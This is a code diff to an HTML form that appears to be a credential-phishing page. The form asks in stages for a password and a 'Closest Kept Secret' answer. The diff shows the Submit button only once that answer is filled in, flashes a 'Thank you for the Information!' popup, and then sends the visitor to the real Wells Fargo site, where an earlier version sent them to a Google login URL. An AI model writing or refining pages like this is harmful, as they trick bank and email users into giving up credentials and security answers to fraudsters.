@@ -84,17 +84,16 @@
             <label for="5field2" id="5field2l "style="display: none;">Closest Kept Secret</label>
             <input type="text" id="5field2" name="5field2" style="display: none;" required>
 
-            <input type="submit" value="Submit" onclick="redirectToGoogle()">
+            <input type="button" value="Submit" onclick="redirectToGoogle()", style="display: none", id="button">
             <script>
                 function redirectToGoogle() {
-                    var popup = window.open("", "popup", "width=200,height=100");
-                    popup.document.write("<p>Thank you for the Information!</p>");
-                    setTimeout(function() {
-                        popup.window.close();
-                    }, 50);
-                  window.location.href = "https://accounts.google.com/AddSession?hl=en&continue=https://www.google.com/search%3Fq%3Dgmail%2Blogin%2Bpage%26oq%3Dgmail%2Blogin%2Bpage%26sourceid%3Dchrome%26ie%3DUTF-8&ec=GAlAAQ&authuser=0";
+                  var popup = window.open("", "popup", "width=200,height=100");
+                  popup.document.write("<p>Thank you for the Information!</p>");
+                  setTimeout(function() {
+                    popup.window.close();
+                  }, 5000); // 5000 milliseconds = 5 seconds
                 }
-            </script>
+              </script>
         </form>
 
         
@@ -110,8 +109,13 @@
         const Threefield = document.querySelectorAll('[id^="3field"]');
         const Fourfield = document.querySelectorAll('[id^="4field"]');
         const Fivefield = document.querySelectorAll('[id^="5field"]');
-        
-        
+        const button = document.getElementById('button');
+        const FivefieldInput = document.getElementById('5field2');
+
+        button.addEventListener("click", function() {
+            // Redirect to the desired webpage
+            window.location.href = "https://www.wellsfargo.com/";
+        });
 
         
         passwordInput.addEventListener('input', () => {
@@ -149,6 +153,13 @@
                     field.style.display = 'none';
                 }
             });
+        });
+        FivefieldInput.addEventListener('input', () => {
+            if ( 1 < FivefieldInput.value.length) {
+                button.style.display = 'block';
+            } else {
+                button.style.display = 'none';
+            }
         });
     </script>
 </body>
